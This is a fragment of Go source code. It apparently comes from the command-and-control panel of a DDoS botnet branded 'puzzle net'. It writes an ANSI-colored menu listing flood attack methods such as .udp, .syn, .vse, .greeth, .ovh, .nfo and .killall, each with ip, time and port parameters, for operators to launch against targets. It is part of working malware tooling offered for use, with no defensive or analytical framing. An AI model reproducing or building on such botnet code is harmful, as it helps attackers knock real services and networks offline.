        if err != nil || cmd == "METHODS" || cmd == "methods" {
            this.conn.Write([]byte("\033[2J\033[1H")) //display main header
            this.conn.Write([]byte("\033[01;31m           -> puzzle net ;) <- \r\n"))
            this.conn.Write([]byte("\033[01;37m ╔══════════════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.frag [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m              ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m              ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.greeth [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.tcpall [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m           ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m         -> puzzle net special methods. ;) <- \r\n"))//@blazing_runs
            this.conn.Write([]byte("\033[01;37m ╔══════════════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.udphex [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.killall [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m            ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.stdhex [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.game [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.raid [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.nfo [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;37m.ice  [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;37m               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
            continue
        }